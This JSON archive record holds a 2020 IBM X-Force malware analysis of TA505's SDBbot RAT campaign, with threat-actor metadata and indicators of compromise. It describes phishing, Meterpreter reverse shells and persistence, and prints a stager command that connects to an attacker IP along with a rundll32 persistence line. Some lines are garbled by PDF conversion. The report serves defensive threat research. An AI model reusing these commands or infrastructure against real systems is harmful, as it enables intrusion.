{
    "id": "20a8727d-418b-456d-8fa5-699e52ed8a05",
    "created_at": "2023-03-03T02:06:18.371375Z",
    "updated_at": "2025-03-27T02:15:38.04481Z",
    "deleted_at": null,
    "sha1_hash": "b67b1c62717800aa0b095c7d56a4e69a19356cf8",
    "title": "2020-04-14 - TA505 Continues to Infect Networks With SDBbot RAT",
    "authors": "",
    "file_creation_date": "2023-03-01T09:20:42Z",
    "file_modification_date": "2023-03-01T09:20:42Z",
    "file_size": 1422421,
    "plain_text": "# TA505 Continues to Infect Networks With SDBbot RAT\n\n**securityintelligence.com/posts/ta505-continues-to-infect-networks-with-sdbbot-rat/**\n\n[Advanced Threats\nApril 14, 2020](https://securityintelligence.com/category/x-force/threats/)\nBy [Melissa Frydrych\n7 min read](https://securityintelligence.com/author/melissa-frydrych/)\n[IBM X-Force Incident Response and Intelligence Services (IRIS) responds to security incidents around the globe. During analysis and](https://www.ibm.com/security/services/ibm-x-force-incident-response-and-intelligence)\ncomparison of malicious activity on enterprise networks, our team identified attacks likely linked to Hive0065, also known as TA505. We\nobserved that Hive0065 continues to spread the SDBbot remote-access Trojan (RAT) alongside other custom malware and continues to\ndisplay tactics used against companies within the past year.\n\nAttacks that deploy malware and RATs on targeted networks are a way for cybercrime groups to compromise networks and open channels for\nfurther activity, which could be immediate, or take place at a later stage. RATs are a common tool in targeted attacks as they enable a vast\narray of remote actions for the attacker. Those include deploying additional malware, spying on users and carrying out actions from the\n\n\n-----\n\nected de ce o se e e e t ey a e sta ed\n\nHive0065 is a financially motivated cybercrime group that has been actively targeting various industries, including finance, retail and\nrestaurants, since at least 2014. This group primarily conducts malicious spam campaigns delivering a wide range of custom and open-source\n[malware. The most notorious among these are campaigns involving banking Trojans such as Dridex and TrickBot, ransomware such as](https://securityintelligence.com/posts/trickbot-pushing-a-2fa-bypass-app-to-bank-customers-in-germany/)\n[Clop/Cryptomix and MINEBRIDGE, and extortion schemes demanding payment in bitcoin.](https://securityintelligence.com/news/new-dll-cryptomix-ransomware-reportedly-using-remote-desktop-services-for-installation/)\n\n## SDBbot and Familiar TTPs\n\nIn November 2019, X-Force IRIS observed a threat actor targeting enterprise employees in Europe with a spear phishing email impersonating\nOnehub, a legitimate, cloud-based file-sharing application for businesses. The email was designed to extract Active Directory (AD) discovery\ndata and user credentials and to infect the environment with the SDBbot RAT. Based on our investigation and analysis of the actor’s tactics,\ntechniques and procedures (TTPs), their command-and-control (C&C) infrastructure and the use of specific malware previously attributed to\nthe group, X-Force IRIS suspects it is highly likely that Hive0065 was behind the attacks.\n\n[SDBbot RAT has been observed in Hive0065 attacks since at least September 2019 and has been used primarily as a secondary payload.](https://www.proofpoint.com/us/threat-insight/post/ta505-distributes-new-sdbbot-remote-access-trojan-get2-downloader)\nThis malware features remote-access capabilities, accepts commands from a C&C server such as video recording, and has the ability to\nexfiltrate data from the victimized devices and networks.\n\n[In a variety of campaigns attributed to this group previously reported by Proofpoint and](https://www.proofpoint.com/us/threat-insight/post/ta505-and-others-launch-new-coronavirus-campaigns-now-largest-collection-attack) [ZeroFOX, Hive0065 was observed to be conducting](https://www.zerofox.com/blog/ta505-halloween-malware/)\nphishing campaigns that delivered malicious Excel (.XLS) files hosted on domains spoofed to appear as the cloud storage sites Sync and\nDropbox. The campaigns also featured C&C infrastructure that spoofs other legitimate services, like Google Drive and Microsoft Office.\n\n[More recent Hive0065 campaigns reported in March 2020 exploited the current interest in the COVID-19 pandemic, using Coronavirus-themed](https://www.proofpoint.com/us/threat-insight/post/ta505-and-others-launch-new-coronavirus-campaigns-now-largest-collection-attack)\nphishing emails to deliver the Locky ransomware and the Dridex banking Trojan. In some campaigns, Hive0065 targeted healthcare\norganizations with emails purporting to come from medical research groups and offering supposed Coronavirus remedies in exchange for\nbitcoin payments. The TTPs used in these campaigns align with those of Hive0065/TA505, specifically the spoofing of cloud storage websites\nto distribute malware files.\n\n## Continued Malicious Activity\n\nResearch conducted during X-Force IRIS investigations found continued malicious activity from Hive0065 that infected company networks with\nmalware and the SDBbot RAT. The TTPs that we found are consistent with previous activity attributed to Hive0065:\n\nSpear phishing to deliver malware\nMacro-enabled documents\nThe use of droppers containing embedded dynamic-link libraries (DLLs)\nThe use of an installer component\nThe use of legitimate cloud hosting services for malware distribution\nSpoofing legitimate services like Microsoft and Google\nC&C domains similar in naming convention and structure (sample of domain names shown below)\n\n\n**Domains reported**\n\n**by X-Force**\n\n\n**Domains reported**\n\n**by Proofpoint**\n\n\n**Domains reported**\n\n**by ZeroFOX**\n\n\ndrm-server-booking[.]com news-server-drm-google[.com office-en-service[.]com\n\nmicrosoft-live-us[.]com update365-office-ens[.]com googledrive-download[.]com\n\ndl1.sync-share[.]com office365-update-en[.]com d1.syncdownloading[.]com\n\nScroll to view full table\n\n## Compromise Summary\n\nIn order to gain access to victim environments, Hive0065 sends a malicious email to employees purporting to be from an HR representative’s\naccount. The email body impersonated Onehub, inviting the recipient to download a malicious document named Resume.doc.\n\n\n-----\n\nThe employee receiving this email downloaded and opened the document, which contained malicious code. Once the code was executed, a\npersistence mechanism was installed and a malicious password harvester was executed. In this instance, once the malicious code was\nexecuted, it dropped a malicious binary (DLL) similar to CobaltStrike, which subsequently created and executed additional files. The actor used\nthe initially compromised system to escalate privileges and move laterally across additional systems on the network.\n\n## Hive0065’s Arsenal of Tools\n\n**VSPUB DLLs With CobaltStrike Code Similarities**\n\nThe malicious email delivering the file named Resume.doc initially led the recipient to a malicious domain. After several redirections, the final\nredirect pointed to the malicious URL hxxps://dl1.sync-share[.]com?Or2at. In addition, we also observed employees who opened the document\nbrowsed to hxxps://dl1.sync-share[.]com and downloaded Resume (1).doc and a second file, Resume (3).doc.\n\nSeconds later, a suspicious document named main_template.docx was created.\n\nEvery time main_template.docx was opened, VBA macros were executed and a fake Microsoft Office login window (FakeL.exe) was displayed\nto the user while a malicious payload executed in the background. If the password entered was correct, the display disappeared. Password\nattempts were written into a file named Password.txt, which was subsequently deleted.\n\nThe document may also display the fake message “This document is protected” to entice users to enable content and execute malicious code.\nThe .docx file contained embedded x86 and x64 versions of the payload DLL so that the appropriate version was dropped depending on the\ntarget operating system.\n\nThe DLLs were dropped to the following locations:\n\nx86: %APPDATA%\\Microsoft\\Windows\\Template\\vspub1.dll\nx64: %APPDATA%\\Microsoft\\Windows\\Template\\vspub2.dll\n\nThe DLLs were loaded to the memory space of winword.exe using LoadLibraryW API, and the DLL module was compressed twice to hide\nactual code. It used a custom packer that unpacks to UPX, an open-source executable packer, which revealed the actual code.\n\n[While these DLLs did not match existing, known code families, a code comparison showed that this code has similarities with the CobaltStrike](https://attack.mitre.org/software/S0154/)\nframework. The VSPUB DLLs gather system information and use HTTP POST requests to send it to the C&C domain microsoft-live_us[.]com/fidonet or the IP address 185[.]176[.]221[.]45. Code suggests that upon successful reply from the server, the DLL can download and_\nexecute additional files.\n\n\n-----\n\no ote, _c oso t_ _e us[ ]co_ as eg ste ed just days be o e t e attac too p ace, a o g t t e do a _sy c s a e[ ]co_, to c ude\nsubdomains dl1.sync-share[.]com, dl2.sync-share[.]com and dl3.sync-share[.]com. Sync-share[.]com is likely attacker-owned infrastructure,\nand although the dl2 and dl3 subdomains were not observed in this particular activity, it is likely that these domains will be used in a similar\nfashion.\n\n**Meterpreter Reverse Shell**\n\nAfter the initial system was compromised, the actors proceeded to compromise additional systems on the network by executing malicious\nPowerShell services running as the local SYSTEM, as well as the installation of bind shells. A Meterpreter reverser shell was used in order to\nremotely control compromised systems within the internal network; it was installed as a service using the execution of an encoded PowerShell\nscript. The malicious PowerShell command decodes into a reverse shell connecting back to two malicious IP addresses:\n\n91[.]214[.]124[.]20\n91[.]214[.]124[.]25\n\nWhile most samples we found during our investigations were Meterpreter reverse shells connecting back to a C&C IP address, Meterpreter\nbind-shells that listen for incoming connections were also discovered. We found that a domain admin account was compromised and the\nActive Directory audit tool PingCastle was run. Using the domain admin, the actor was able to compromise several other accounts and execute\nmalicious services and persistence mechanisms, namely SDBbot RAT Loaders.\n\n**TinyMet Meterpreter Stager**\n\nThe investigation led our team to the discovery of a file named wsus.exe (a version of TinyMet, a tiny, flexible Meterpreter stager), along with\nthree additional files that were created and executed on the first compromised system.\n\nDuring the investigation, TinyMet was observed being executed with the command c:\\intel\\wsus.exe 1 91.214.124[.]20 43434, indicating a\nreverse HTTP connection, and connected to a malicious IP address by either renaming a binary or providing specific arguments. The\ncommands executed were used for discovery purposes, listing members of privileged groups and network information.\n\n## SDBbot RAT\n\n**SDBbot RAT Installer**\n\nX-Force IRIS found that the SDBbot RAT installers are x64-packed and decrypt parts of SDBbot’s code and strings upon execution. In addition,\nthey read a binary blob located within the registry HKLM\\\\MACHINE\\\\SOFTWARE\\\\Microsoft\\\\[3 characters]\\[1 character]. Depending on user\nprivileges, a binary blog is located in the registry value. If regular user privileges are running, the installer component will establish persistence\nusing the registry Run and execute ordinal #1 of the DLL:\n\n_rundll32 “C:\\Users\\[USER]\\AppData\\Roaming\\xrjkrobuy.dll”,#1_\n\n**SDBbot RAT Loader**\n\nAs part of the investigation, X-Force IRIS found that the SDBbot RAT loader we analyzed was similar in nature to the version analyzed by\n[Proofpoint, which was defined as the “Loader Component” of SDBbot in Hive0065 campaigns from October 2019. The loader component will](https://www.proofpoint.com/us/threat-insight/post/ta505-distributes-new-sdbbot-remote-access-trojan-get2-downloader)\nread the binary blob and execute the contained shellcode. Once the shellcode executes, it decompresses and executes the SDBbot payload.\nThe shellcode will check to see if it was executed earlier than the loader DLL files and if found to be “TRUE,” the process is terminated.\n\n**SDBbot RAT Payload**\n\nOnce the attackers established a foothold on the network, four new registry keys on the local Software hive were created and SDBbot RAT\nloader DLL files were installed as persistence mechanisms; the loaders were injected into the process winlogon.exe every time the process\nwas executed.\n\nUpon execution, SDBbot RAT checks for the presence of the mutex windows_7_windows_10_check_running_once_mutex and proceeds to\nretrieve a C&C address from the file C:\\ip.txt. If that file is not available, it will use the C&C drm-server-booking[.]com as the default server.\nSDBbot RAT will subsequently gather system information and communicate back to the C&C server by sending and receiving a DWORD:\n0xC0DE0000. The C&C will send additional arguments depending on the command.\n\n## Conclusion\n\nHive0065 has been active since at least 2014, adjusting its TTPs, targeting and infrastructure with each campaign. A relatively recent addition\nto Hive0065’s toolkit, SDBbot, is being used in attacks primarily as a second-stage malware, composed of an installer, a loader and RAT\ncomponents.\n\nSDBbot has the ability to perform typical RAT functions, such as communicating with C&Cs, receiving commands and obtaining system\ninformation. On infected systems, this malware could grant attackers extensive ability to drop and execute additional malicious payloads,\ncontrol infected systems and perform actions the legitimate user would have access to. Remote-access Trojans are one of the most prevalent\ntools in targeted attacks as they facilitate that type of control for remote attackers.\n\n\n-----\n\ns o ce S co t ues to t ac e0065, e e pect to see t s g oup co t ue to ta get a de a ge o dust es us g soc a\nengineering to deliver open-source and custom malware while constantly adjusting TTPs and C&C infrastructure to evade detection.\n\n## Indicators of Compromise (IoCs)\n\n**C&C IP Addresses**\n\n91[.]214[.]124[.]25\n91[.]214[.]124[.]20\n185[.]176[.]221[.]45\n\n**C&C Domains**\n\ndrm-server-booking[.]com\nmicrosoft-live-us[.]com\ndl1.sync-share[.]com\n\n**URL Redirections**\n\nhttps://eur01.safelinks.protection.outlook[.]com/?\nurl=https://clck.ru/JnFFT&data=02|01||bed42450519b40df4d8808d762bd4ff1|d847080b33824b27886012fe4d8edb27|1|0|6370864375652237\nhttps://clck[.]ru/JnFFT\nhttps://sba.yandex[.]net/redirect?url=https%3A%2F%2Fdl1.syncshare.com%3FOr2at&client=clck&sign=2a3f3d25a38344769c6cfb6705a0f918′\n\n**Final Redirection Hosting Malicious Document**\n\nhttps://dl1.sync-share[.]com?Or2at\n\n**Files**\n\n**File name** **SHA1** **Description**\n\nmain_template.docx 33094acd614825a916b77df6c5141c088fc3768b Malicious document\n\nvspub1.dll bf0f7abda2228059bb00ec9658ee447fbe84d277 CobaltStrike similarities\n\nvspub2.dll d40510da42a478d72e649993208710668a7f6c27 CobaltStrike similarities\n\nxrjkrobuy.dll 14f52ae68344e1643b3066c10f7044fdd819db4e SDBot RAT\n\nupywloeza.dll 0cc7cca16afd632857e3883c06b2f55c057b563e SDBot RAT\n\ndtzvlbtxn.dll d36e983886a084887f887c6d562d3bc0664587c4 SDBot RAT\n\nlvgoywrnxwy.dll fea7d944e317c7b2ef1aba57600a8c5310368085 SDBot RAT\n\nqcuqqgxmy.dll 35423e04e58ab1f2267e19c47e1c69ea5b7041cc SDBot RAT\n\npdxqzmftr.dll fd9620c0c295caaee3096423532bb1dbfb7064c5 SDBot RAT\n\nlowpro3.13.exe cb0b39534d99057b02b090c3650fb1de43d19a02 Binary\n\nwsus.exe caff1d315a5d87014e5fa62346f58407755d971e Meterpreter stager\n\nFakeL.exe 45c43ec18d15ba7850e6ad2e2e54671636f4d926 Password Stealer\n\nScroll to view full table\n\n[Melissa Frydrych](https://securityintelligence.com/author/melissa-frydrych/)\nThreat Hunt Researcher, IBM\n\nMelissa is an analyst on the Threat Hunt & Discovery Team within IBM X-Force. She has over 9 years of experience, investigating and\nanalyzing cyber threa...\n\nPOPULAR\n\n\n-----\n\n[Intelligence & Analytics February 21, 2023](https://securityintelligence.com/category/topics/security-intelligence-analytics/)\n\n## Backdoor Deployment and Ransomware: Top Threats Identified in X-Force Threat Intelligence Index 2023\n\n4 min read - Discover how threat actors are waging attacks and how to proactively protect your organization with top findings from the 2023 XForce Threat Intelligence Index.\n\n\n-----\n\n-----\n\n-----\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2020/2020-04-14 - TA505 Continues to Infect Networks With SDBbot RAT.pdf"
    ],
    "report_names": [
        "2020-04-14 - TA505 Continues to Infect Networks With SDBbot RAT.pdf"
    ],
    "threat_actors": [
        {
            "id": "81dde5cc-c29f-430d-8c6e-e5e92d5015e7",
            "created_at": "2022-10-25T16:07:23.704358Z",
            "updated_at": "2025-03-27T02:02:09.932453Z",
            "deleted_at": null,
            "main_name": "Harvester",
            "aliases": [],
            "source_name": "ETDA:Harvester",
            "tools": [
                "Agentemis",
                "Cobalt Strike",
                "CobaltStrike",
                "Graphon",
                "Metasploit",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "99cb4e5b-8071-4f9e-aa1d-45bfbb6197e3",
            "created_at": "2023-01-06T13:46:38.860754Z",
            "updated_at": "2025-03-27T02:00:02.937438Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "SectorJ04 Group",
                "Dudear",
                "G0092",
                "ATK103",
                "Hive0065",
                "Spandex Tempest",
                "GRACEFUL SPIDER",
                "GOLD TAHOE",
                "CHIMBORAZO",
                "SectorJ04"
            ],
            "source_name": "MISPGALAXY:TA505",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "1a76ed30-4daf-4817-98ae-87c667364464",
            "created_at": "2022-10-25T16:47:55.891029Z",
            "updated_at": "2025-03-27T02:05:17.408867Z",
            "deleted_at": null,
            "main_name": "IRON LIBERTY",
            "aliases": [
                "ATK6 ",
                "BROMINE ",
                "CASTLE ",
                "Crouching Yeti ",
                "DYMALLOY ",
                "Dragonfly ",
                "Energetic Bear / Berserk Bear ",
                "Ghost Blizzard ",
                "TEMP.Isotope ",
                "TG-4192 ",
                "ALLANITE "
            ],
            "source_name": "Secureworks:IRON LIBERTY",
            "tools": [
                " Ddex Loader",
                " Havex",
                " Karagany",
                " Loek",
                " MCMD",
                " Sysmain",
                " xfrost",
                "ClientX"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "5e6b31a6-80e3-4e7d-8b0a-d94897ce9b59",
            "created_at": "2024-06-19T02:03:08.128175Z",
            "updated_at": "2025-03-27T02:05:17.400394Z",
            "deleted_at": null,
            "main_name": "GOLD TAHOE",
            "aliases": [
                "SectorJ04 ",
                "Spandex Tempest ",
                "TA505 ",
                "FIN11 "
            ],
            "source_name": "Secureworks:GOLD TAHOE",
            "tools": [
                " Cobalt Strike",
                " FlawedAmmy",
                " Get2",
                " GraceWire",
                " Malichus",
                " SDBbot",
                " ServHelper",
                " TrueBot",
                "Clop"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "75d4d6a9-b5d1-4087-a7a0-e4a9587c45f4",
            "created_at": "2022-10-25T15:50:23.5188Z",
            "updated_at": "2025-03-27T02:00:55.489882Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "TA505",
                "Hive0065",
                "Spandex Tempest",
                "CHIMBORAZO"
            ],
            "source_name": "MITRE:TA505",
            "tools": [
                "AdFind",
                "Azorult",
                "FlawedAmmyy",
                "Mimikatz",
                "Dridex",
                "TrickBot",
                "Get2",
                "FlawedGrace",
                "Cobalt Strike",
                "ServHelper",
                "Amadey",
                "SDBbot",
                "PowerSploit"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "e447d393-c259-46e2-9932-19be2ba67149",
            "created_at": "2022-10-25T16:07:24.28282Z",
            "updated_at": "2025-03-27T02:02:10.159466Z",
            "deleted_at": null,
            "main_name": "TA505",
            "aliases": [
                "ATK 103",
                "Chimborazo",
                "Gold Evergreen",
                "Gold Tahoe",
                "Graceful Spider",
                "Hive0065",
                "Operation Tovar",
                "Operation Trident Breach",
                "SectorJ04",
                "Spandex Tempest",
                "TA505",
                "TEMP.Warlock"
            ],
            "source_name": "ETDA:TA505",
            "tools": [
                "Amadey",
                "AmmyyRAT",
                "AndroMut",
                "Azer",
                "Bart",
                "Bugat v5",
                "CryptFile2",
                "CryptoLocker",
                "CryptoMix",
                "CryptoShield",
                "Dridex",
                "Dudear",
                "EmailStealer",
                "FRIENDSPEAK",
                "Fake Globe",
                "Fareit",
                "FlawedAmmyy",
                "FlawedGrace",
                "FlowerPippi",
                "GOZ",
                "GameOver Zeus",
                "GazGolder",
                "Gelup",
                "Get2",
                "GetandGo",
                "GlobeImposter",
                "Gorhax",
                "GraceWire",
                "Gussdoor",
                "Jaff",
                "Kasidet",
                "Kegotip",
                "Kneber",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Locky",
                "MINEBRIDGE",
                "MINEBRIDGE RAT",
                "MirrorBlast",
                "Neutrino Bot",
                "Neutrino Exploit Kit",
                "P2P Zeus",
                "Peer-to-Peer Zeus",
                "Philadelphia",
                "Philadephia Ransom",
                "Pony Loader",
                "Rakhni",
                "ReflectiveGnome",
                "Remote Manipulator System",
                "RockLoader",
                "RuRAT",
                "SDBbot",
                "ServHelper",
                "Shifu",
                "Siplog",
                "TeslaGun",
                "TiniMet",
                "TinyMet",
                "Trojan.Zbot",
                "Wsnpoem",
                "Zbot",
                "Zeta",
                "ZeuS",
                "Zeus"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1677809178,
    "ts_updated_at": 1743041738,
    "ts_creation_date": 1677662442,
    "ts_modification_date": 1677662442,
    "files": {
        "pdf": "https://archive.orkl.eu/b67b1c62717800aa0b095c7d56a4e69a19356cf8.pdf",
        "text": "https://archive.orkl.eu/b67b1c62717800aa0b095c7d56a4e69a19356cf8.txt",
        "img": "https://archive.orkl.eu/b67b1c62717800aa0b095c7d56a4e69a19356cf8.jpg"
    }
}